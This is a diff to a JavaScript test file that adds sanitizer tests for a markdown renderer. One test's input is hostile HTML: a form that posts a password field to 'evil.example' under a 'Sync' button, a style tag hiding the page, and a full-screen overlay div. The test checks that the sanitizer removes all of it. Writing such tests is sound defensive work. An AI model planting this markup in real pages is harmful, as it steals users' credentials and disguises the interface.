@@ -22,6 +22,25 @@ describe('renderContentMarkdown', () => {
 		expect(html).not.toContain('onerror');
 		expect(html).not.toContain('<script');
 	});
+
+	// Nothing here runs, and all of it deceives: a form posts what the reader types to a stranger, and
+	// a style can draw over the app's own dialogs. DOMPurify's defaults keep every one of them.
+	it('strips markup that deceives without executing', () => {
+		const html = renderContentMarkdown(
+			'<form action="https://evil.example"><input type="password"><button>Sync</button></form>' +
+				'<style>body{display:none}</style>' +
+				'<div style="position:fixed;inset:0">over</div>',
+		);
+		for (const gone of ['<form', '<input', '<button', '<style', 'style='])
+			expect(html).not.toContain(gone);
+		expect(html).toContain('over');
+	});
+
+	it('keeps the classes the renderer adds itself', () => {
+		expect(renderContentMarkdown('<table><tr><td>a</td></tr></table>')).toContain(
+			'class="prose-table-scroll"',
+		);
+	});
 });
 
 describe('renderContentMarkdownInline', () => {
